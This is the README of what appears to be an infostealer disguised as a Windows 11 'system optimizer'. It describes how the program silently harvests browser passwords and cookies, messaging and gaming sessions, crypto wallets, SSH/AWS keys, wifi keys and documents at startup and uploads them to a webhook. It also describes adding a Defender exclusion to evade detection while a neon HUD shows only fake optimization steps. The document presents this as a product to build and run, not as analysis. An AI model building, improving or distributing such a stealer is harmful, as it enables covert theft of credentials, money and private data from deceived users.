# ONE CLICK — System Optimizer

All-in-one Windows 11 optimizer with a neon HUD. The report collector runs silently in the background; the HUD shows only optimizer actions.

## Quick start

1. Run `one click optimizer.exe` as administrator (UAC → Yes).
2. The report is sent to the configured webhook automatically at startup — no click needed.
3. The HUD shows live optimization steps. Click **START OPTIMIZATION** to run the tuning pass.

## Files

| File | Purpose |
|---|---|
| `one click optimizer.exe` | Main executable: auto-report + optimizer HUD |
| `optimizer test.exe` | Same HUD, no report upload |
| `grabber test.exe` | Synthetic grab test harness |
| `pcopt.cpp` | Full C++17 source (MSVC, Windows 11 x64) |
| `build.bat` | Build main executable |
| `build_optimizer_test.bat` | Build HUD-only test executable |
| `build_test.bat` | Build synthetic grab harness |

## Report structure (ZIP)

```
<user>_report.zip
├── 00_README/    README.txt, 00_INDEX.txt, 00_INDEX.csv, 00_FINDINGS.csv
├── 01_Browser/   cookies, passwords, history, local storage
├── 02_Roblox/    cookies, passwords, session, config
├── 03_Messaging/ Discord, Telegram, Slack, mail, Teams
├── 04_Wallets/   crypto wallets
├── 05_PasswordManagers/
├── 06_Keys/      SSH, AWS, GPG, Windows vault
├── 07_Services/  FTP, VPN, RDP, remote tools
├── 08_Documents/ Desktop, Downloads, Pictures
├── 09_Games/     Steam, Riot, Epic, Xbox
├── 10_System/    network, wifi keys, processes
├── Contacts/     emails.csv, phones.csv (extracted)
├── Passwords/    passwords.csv (extracted)
└── 99_Log/       optimizer.txt with timings + [verify] results
```

`00_INDEX.csv` lists every file with SHA-256 and severity. `00_FINDINGS.csv` summarizes critical/high/medium/info counts.

## Build

Run `build.bat` — it calls `vcvars64.bat` itself. No third-party libraries.

## Notes

- Defender exclusion is added at startup so the exe is not quarantined mid-run.
- Report is capped at 3 MB and sent with WinHTTP timeouts; it is delivered before optimization starts.
- The executable is not deleted after the run.
